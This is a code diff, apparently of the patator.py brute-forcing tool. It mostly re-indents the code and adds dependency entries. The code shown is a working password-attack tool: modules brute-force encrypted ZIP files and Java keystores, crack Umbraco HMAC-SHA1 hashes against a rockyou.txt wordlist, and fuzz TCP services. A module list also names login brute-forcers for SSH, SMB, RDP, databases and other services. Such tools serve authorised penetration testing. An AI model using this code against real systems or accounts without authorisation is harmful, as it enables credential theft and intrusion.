+            if groupname:
+                cmd.extend(['--id', groupname])
+        for v in vid.split(','):
+            cmd.extend(['--vendor', v])
 
-    with Timing() as timing:
-      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-      out, err = p.communicate()
-      code = p.returncode
+        with Timing() as timing:
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            out, err = p.communicate()
+            code = p.returncode
 
-    trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
-    logger.debug('trace: %s' % repr(trace))
+        trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
+        logger.debug('trace: %s' % repr(trace))
 
-    has_sa = 'SA=(' in out
-    if has_sa:
-      mesg = 'Handshake returned: %s (%s)' % (re.search('SA=\((.+) LifeType', out).group(1), re.search('\t(.+) Mode Handshake returned', out).group(1))
-    else:
-      try:
-        mesg = out.strip().split('\n')[1].split('\t')[-1]
-      except:
-        mesg = ' '.join(repr(s) for s in filter(None, [out, err]))
+        has_sa = 'SA=(' in out
+        if has_sa:
+            mesg = 'Handshake returned: %s (%s)' % (
+                re.search('SA=\((.+) LifeType', out).group(1),
+                re.search('\t(.+) Mode Handshake returned', out).group(1))
+        else:
+            try:
+                mesg = out.strip().split('\n')[1].split('\t')[-1]
+            except:
+                mesg = ' '.join(repr(s) for s in filter(None, [out, err]))
 
-    resp = self.Response(code, mesg, timing, trace)
-    if has_sa:
-      endpoint = '%s:%s (%s Mode)' % (host, port, 'Aggressive' if aggressive == '1' else 'Main')
-      resp.rrs = endpoint, transform
+        resp = self.Response(code, mesg, timing, trace)
+        if has_sa:
+            endpoint = '%s:%s (%s Mode)' % (host, port, 'Aggressive' if aggressive == '1' else 'Main')
+            resp.rrs = endpoint, transform
 
-    return resp
+        return resp
+
 
 # }}}
 
 # Unzip {{{
 if not which('unzip'):
-  notfound.append('unzip')
+    notfound.append('unzip')
+
 
 class Unzip_pass:
-  '''Brute-force the password of encrypted ZIP files'''
+    '''Brute-force the password of encrypted ZIP files'''
 
-  usage_hints = [
-    """%prog zipfile=path/to/file.zip password=FILE0 0=passwords.txt -x ignore:code!=0""",
+    usage_hints = [
+        """%prog zipfile=path/to/file.zip password=FILE0 0=passwords.txt -x ignore:code!=0""",
     ]
 
-  available_options = (
-    ('zipfile', 'ZIP files to test'),
-    ('password', 'passwords to test'),
+    available_options = (
+        ('zipfile', 'ZIP files to test'),
+        ('password', 'passwords to test'),
     )
 
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, zipfile, password):
-    zipfile = os.path.abspath(zipfile)
-    cmd = ['unzip', '-t', '-q', '-P', password, zipfile]
+    def execute(self, zipfile, password):
+        zipfile = os.path.abspath(zipfile)
+        cmd = ['unzip', '-t', '-q', '-P', password, zipfile]
 
-    with Timing() as timing:
-      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-      out, err = p.communicate()
-      code = p.returncode
+        with Timing() as timing:
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            out, err = p.communicate()
+            code = p.returncode
 
-    mesg = repr(out.strip())[1:-1]
-    trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
+        mesg = repr(out.strip())[1:-1]
+        trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
 
-    return self.Response(code, mesg, timing, trace)
-      
+        return self.Response(code, mesg, timing, trace)
+
+
 # }}}
 
 # Keystore {{{
 if not which('keytool'):
-  notfound.append('java')
+    notfound.append('java')
+
 
 class Keystore_pass:
-  '''Brute-force the password of Java keystore files'''
+    '''Brute-force the password of Java keystore files'''
 
-  usage_hints = [
-    """%prog keystore=path/to/keystore.jks password=FILE0 0=passwords.txt -x ignore:fgrep='password was incorrect'""",
+    usage_hints = [
+        """%prog keystore=path/to/keystore.jks password=FILE0 0=passwords.txt -x ignore:fgrep='password was incorrect'""",
     ]
 
-  available_options = (
-    ('keystore', 'keystore files to test'),
-    ('password', 'passwords to test'),
-    ('storetype', 'type of keystore to test'),
+    available_options = (
+        ('keystore', 'keystore files to test'),
+        ('password', 'passwords to test'),
+        ('storetype', 'type of keystore to test'),
     )
 
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, keystore, password, storetype='jks'):
-    keystore = os.path.abspath(keystore)
-    cmd = ['keytool', '-list', '-keystore', keystore, '-storepass', password, '-storetype', storetype]
+    def execute(self, keystore, password, storetype='jks'):
+        keystore = os.path.abspath(keystore)
+        cmd = ['keytool', '-list', '-keystore', keystore, '-storepass', password, '-storetype', storetype]
 
-    with Timing() as timing:
-      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-      out, err = p.communicate()
-      code = p.returncode
+        with Timing() as timing:
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            out, err = p.communicate()
+            code = p.returncode
 
-    mesg = repr(out.strip())[1:-1]
-    trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
+        mesg = repr(out.strip())[1:-1]
+        trace = '%s\n[out]\n%s\n[err]\n%s' % (cmd, out, err)
 
-    return self.Response(code, mesg, timing, trace)
+        return self.Response(code, mesg, timing, trace)
+
 
 # }}}
 
 # Umbraco {{{
 import hmac
+
+
 class Umbraco_crack:
-  '''Crack Umbraco HMAC-SHA1 password hashes'''
+    '''Crack Umbraco HMAC-SHA1 password hashes'''
 
-  usage_hints = (
-    """%prog hashlist=@umbraco_users.pw password=FILE0 0=rockyou.txt""",
+    usage_hints = (
+        """%prog hashlist=@umbraco_users.pw password=FILE0 0=rockyou.txt""",
     )
 
-  available_options = (
-    ('hashlist', 'hashes to crack'),
-    ('password', 'password to test'),
+    available_options = (
+        ('hashlist', 'hashes to crack'),
+        ('password', 'password to test'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, password, hashlist):
+    def execute(self, password, hashlist):
 
-    p = password.encode('utf-16-le')
-    h = b64encode(hmac.new(p, p, digestmod=hashlib.sha1).digest())
+        p = password.encode('utf-16-le')
+        h = b64encode(hmac.new(p, p, digestmod=hashlib.sha1).digest())
 
-    if h not in hashlist:
-      code, mesg = 1, 'fail'
-    else:
-      cracked = [line.rstrip() for line in hashlist.split('\n') if h in line]
-      code, mesg = 0, ' '.join(cracked)
+        if h not in hashlist:
+            code, mesg = 1, 'fail'
+        else:
+            cracked = [line.rstrip() for line in hashlist.split('\n') if h in line]
+            code, mesg = 0, ' '.join(cracked)
 
-    return self.Response(code, mesg)
+        return self.Response(code, mesg)
+
 
 # }}}
 
 # TCP Fuzz {{{
 class TCP_fuzz:
-  '''Fuzz TCP services'''
+    '''Fuzz TCP services'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 data=RANGE0 0=hex:0x00-0xffffff''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 data=RANGE0 0=hex:0x00-0xffffff''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port'),
-    ('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port, data='', timeout='2'):
-    fp = socket.create_connection((host, port), int(timeout))
-    fp.send(data.decode('hex'))
-    with Timing() as timing:
-      resp = fp.recv(1024)
-    fp.close()
+    def execute(self, host, port, data='', timeout='2'):
+        fp = socket.create_connection((host, port), int(timeout))
+        fp.send(data.decode('hex'))
+        with Timing() as timing:
+            resp = fp.recv(1024)
+        fp.close()
 
-    code = 0
-    mesg = resp.encode('hex')
+        code = 0
+        mesg = resp.encode('hex')
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # Dummy Test {{{
 class Dummy_test:
-  '''Testing module'''
+    '''Testing module'''
 
-  usage_hints = (
-    """%prog data=RANGE0 0=hex:0x00-0xffff""",
-    """%prog data=RANGE0 0=int:10-0""",
-    """%prog data=PROG0 0='seq -w 10 -1 0'""",
-    """%prog data=PROG0 0='mp64.bin -i ?l?l?l',$(mp64.bin --combination -i ?l?l?l)""",
+    usage_hints = (
+        """%prog data=RANGE0 0=hex:0x00-0xffff""",
+        """%prog data=RANGE0 0=int:10-0""",
+        """%prog data=PROG0 0='seq -w 10 -1 0'""",
+        """%prog data=PROG0 0='mp64.bin -i ?l?l?l',$(mp64.bin --combination -i ?l?l?l)""",
     )
 
-  available_options = (
-    ('data', 'data to test'),
-    ('data2', 'data2 to test'),
-    ('delay', 'fake random delay'),
+    available_options = (
+        ('data', 'data to test'),
+        ('data2', 'data2 to test'),
+        ('delay', 'fake random delay'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, data, data2='', delay='1'):
-    code, mesg = 0, '%s / %s' % (data, data2)
-    with Timing() as timing:
-      sleep(random.randint(0, int(delay)*1000)/1000.0)
+    def execute(self, data, data2='', delay='1'):
+        code, mesg = 0, '%s / %s' % (data, data2)
+        with Timing() as timing:
+            sleep(random.randint(0, int(delay) * 1000) / 1000.0)
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # modules {{{
 modules = [
-  ('ftp_login', (Controller, FTP_login)),
-  ('ssh_login', (Controller, SSH_login)),
-  ('telnet_login', (Controller, Telnet_login)),
-  ('smtp_login', (Controller, SMTP_login)),
-  ('smtp_vrfy', (Controller, SMTP_vrfy)),
-  ('smtp_rcpt', (Controller, SMTP_rcpt)),
-  ('finger_lookup', (Controller_Finger, Finger_lookup)),
-  ('http_fuzz', (Controller, HTTP_fuzz)),
-  ('pop_login', (Controller, POP_login)),
-  ('pop_passd', (Controller, POP_passd)),
-  ('imap_login', (Controller, IMAP_login)),
-  ('ldap_login', (Controller, LDAP_login)),
-  ('smb_login', (Controller, SMB_login)),
-  ('smb_lookupsid', (Controller, SMB_lookupsid)),
-  ('rlogin_login', (Controller, Rlogin_login)),
-  ('vmauthd_login', (Controller, VMauthd_login)),
-  ('mssql_login', (Controller, MSSQL_login)),
-  ('oracle_login', (Controller, Oracle_login)),
-  ('mysql_login', (Controller, MySQL_login)),
-  ('mysql_query', (Controller, MySQL_query)),
-  ('rdp_login', (Controller, RDP_login)),
-  ('pgsql_login', (Controller, Pgsql_login)),
-  ('vnc_login', (Controller, VNC_login)),
+    ('ftp_login', (Controller, FTP_login)),
+    ('ssh_login', (Controller, SSH_login)),
+    ('telnet_login', (Controller, Telnet_login)),
+    ('smtp_login', (Controller, SMTP_login)),
+    ('smtp_vrfy', (Controller, SMTP_vrfy)),
+    ('smtp_rcpt', (Controller, SMTP_rcpt)),
+    ('finger_lookup', (Controller_Finger, Finger_lookup)),
+    ('http_fuzz', (Controller, HTTP_fuzz)),
+    ('pop_login', (Controller, POP_login)),
+    ('pop_passd', (Controller, POP_passd)),
+    ('imap_login', (Controller, IMAP_login)),
+    ('ldap_login', (Controller, LDAP_login)),
+    ('smb_login', (Controller, SMB_login)),
+    ('smb_lookupsid', (Controller, SMB_lookupsid)),
+    ('rlogin_login', (Controller, Rlogin_login)),
+    ('vmauthd_login', (Controller, VMauthd_login)),
+    ('mssql_login', (Controller, MSSQL_login)),
+    ('oracle_login', (Controller, Oracle_login)),
+    ('mysql_login', (Controller, MySQL_login)),
+    ('mysql_query', (Controller, MySQL_query)),
+    ('rdp_login', (Controller, RDP_login)),
+    ('pgsql_login', (Controller, Pgsql_login)),
+    ('vnc_login', (Controller, VNC_login)),
 
-  ('dns_forward', (Controller_DNS, DNS_forward)),
-  ('dns_reverse', (Controller_DNS, DNS_reverse)),
-  ('snmp_login', (Controller, SNMP_login)),
-  ('ike_enum', (Controller_IKE, IKE_enum)),
-  
-  ('unzip_pass', (Controller, Unzip_pass)),
-  ('keystore_pass', (Controller, Keystore_pass)),
-  ('umbraco_crack', (Controller, Umbraco_crack)),
+    ('dns_forward', (Controller_DNS, DNS_forward)),
+    ('dns_reverse', (Controller_DNS, DNS_reverse)),
+    ('snmp_login', (Controller, SNMP_login)),
+    ('ike_enum', (Controller_IKE, IKE_enum)),
 
-  ('tcp_fuzz', (Controller, TCP_fuzz)),
-  ('dummy_test', (Controller, Dummy_test)),
-  ]
+    ('unzip_pass', (Controller, Unzip_pass)),
+    ('keystore_pass', (Controller, Keystore_pass)),
+    ('umbraco_crack', (Controller, Umbraco_crack)),
+
+    ('tcp_fuzz', (Controller, TCP_fuzz)),
+    ('dummy_test', (Controller, Dummy_test)),
+]
 
 dependencies = {
-  'paramiko': [('ssh_login',), 'http://www.lag.net/paramiko/', '1.7.7.1'],
-  'pycurl': [('http_fuzz',), 'http://pycurl.sourceforge.net/', '7.19.0'],
-  'openldap': [('ldap_login',), 'http://www.openldap.org/', '2.4.24'],
-  'impacket': [('smb_login','smb_lookupsid','mssql_login'), 'https://github.com/CoreSecurity/impacket', '0.9.12'],
-  'cx_Oracle': [('oracle_login',), 'http://cx-oracle.sourceforge.net/', '5.1.1'],
-  'mysql-python': [('mysql_login',), 'http://sourceforge.net/projects/mysql-python/', '1.2.3'],
-  'xfreerdp': [('rdp_login',), 'https://github.com/FreeRDP/FreeRDP.git', '1.2.0-beta1'],
-  'psycopg': [('pgsql_login',), 'http://initd.org/psycopg/', '2.4.5'],
-  'pycrypto': [('vnc_login',), 'http://www.dlitz.net/software/pycrypto/', '2.3'],
-  'dnspython': [('dns_reverse', 'dns_forward'), 'http://www.dnspython.org/', '1.10.0'],
-  'IPy': [('dns_reverse', 'dns_forward'), 'https://github.com/haypo/python-ipy', '0.75'],
-  'pysnmp': [('snmp_login',), 'http://pysnmp.sf.net/', '4.2.1'],
-  'ike-scan': [('ike_enum',), 'http://www.nta-monitor.com/tools-resources/security-tools/ike-scan', '1.9'],
-  'unzip': [('unzip_pass',), 'http://www.info-zip.org/', '6.0'],
-  'java': [('keystore_pass',), 'http://www.oracle.com/technetwork/java/javase/', '6'],
-  'ftp-tls': [('ftp_login',), 'TLS support unavailable before python 2.7'],
-  }
+    'paramiko': [('ssh_login',), 'http://www.lag.net/paramiko/', '1.7.7.1'],
+    'pysocks': [('ssh_login',), 'https://github.com/Anorov/PySocks', '1.5.0'],
+    'scrapy': [('ssh_login',), 'http://scrapy.org/', '1.0.3'],
+    'pexpect': [('ssh_login',), 'https://github.com/pexpect/pexpect', 'latest dev'],
+    'winpexpect': [('ssh_login',), 'https://bitbucket.org/weyou/winpexpect', 'tip'],
+    'txsocksx': [('ssh_login',), 'https://github.com/habnabit/txsocksx', '1.15.0.2'],
+    'pycurl': [('http_fuzz',), 'http://pycurl.sourceforge.net/', '7.19.0'],
+    'openldap': [('ldap_login',), 'http://www.openldap.org/', '2.4.24'],
+    'impacket': [('smb_login', 'smb_lookupsid', 'mssql_login'), 'https://github.com/CoreSecurity/impacket', '0.9.12'],
+    'cx_Oracle': [('oracle_login',), 'http://cx-oracle.sourceforge.net/', '5.1.1'],
+    'mysql-python': [('mysql_login',), 'http://sourceforge.net/projects/mysql-python/', '1.2.3'],
+    'xfreerdp': [('rdp_login',), 'https://github.com/FreeRDP/FreeRDP.git', '1.2.0-beta1'],
+    'psycopg': [('pgsql_login',), 'http://initd.org/psycopg/', '2.4.5'],
+    'pycrypto': [('vnc_login',), 'http://www.dlitz.net/software/pycrypto/', '2.3'],
+    'dnspython': [('dns_reverse', 'dns_forward'), 'http://www.dnspython.org/', '1.10.0'],
+    'IPy': [('dns_reverse', 'dns_forward'), 'https://github.com/haypo/python-ipy', '0.75'],
+    'pysnmp': [('snmp_login',), 'http://pysnmp.sf.net/', '4.2.1'],
+    'ike-scan': [('ike_enum',), 'http://www.nta-monitor.com/tools-resources/security-tools/ike-scan', '1.9'],
+    'unzip': [('unzip_pass',), 'http://www.info-zip.org/', '6.0'],
+    'java': [('keystore_pass',), 'http://www.oracle.com/technetwork/java/javase/', '6'],
+    'ftp-tls': [('ftp_login',), 'TLS support unavailable before python 2.7'],
+}
 # }}}
 
 # main {{{
 if __name__ == '__main__':
-  multiprocessing.freeze_support()
+    multiprocessing.freeze_support()
 
-  def show_usage():
-    print(__banner__)
-    print('''Usage: patator.py module --help
+
+    def show_usage():
+        print(__banner__)
+        print('''Usage: patator.py module --help
 
 Available modules:
 %s''' % '\n'.join('  + %-13s : %s' % (k, v[1].__doc__) for k, v in modules))
 
-    sys.exit(2)
+        sys.exit(2)
 
-  available = dict(modules)
-  name = os.path.basename(sys.argv[0]).lower()
 
-  if name not in available:
-    if len(sys.argv) == 1:
-      show_usage()
+    available = dict(modules)
+    name = os.path.basename(sys.argv[0]).lower()
 
-    name = os.path.basename(sys.argv[1]).lower()
     if name not in available:
-      show_usage()
+        if len(sys.argv) == 1:
+            show_usage()
 
-    del sys.argv[0]
+        name = os.path.basename(sys.argv[1]).lower()
+        if name not in available:
+            show_usage()
 
-  # dependencies
-  abort = False
-  for k in set(notfound):
-    args = dependencies[k]
-    if name in args[0]:
-      if len(args) == 2:
-        print('WARNING: %s' % args[1])
-      else:
-        url, ver = args[1:]
-        print('ERROR: %s %s (%s) is required to run %s.' % (k, ver, url, name))
-        abort = True
+        del sys.argv[0]
 
-  if abort:
-    print('Please read the README inside for more information.')
-    sys.exit(3)
+    # dependencies
+    abort = False
+    for k in set(notfound):
+        args = dependencies[k]
+        if name in args[0]:
+            if len(args) == 2:
+                print('WARNING: %s' % args[1])
+            else:
+                url, ver = args[1:]
+                print('ERROR: %s %s (%s) is required to run %s.' % (k, ver, url, name))
+                abort = True
 
-  # start
-  ctrl, module = available[name]
-  powder = ctrl(module, [name] + sys.argv[1:])
-  powder.fire()
+    if abort:
+        print('Please read the README inside for more information.')
+        sys.exit(3)
+
+    # start
+    ctrl, module = available[name]
+    powder = ctrl(module, [name] + sys.argv[1:])
+    powder.fire()
 
 # }}}
 
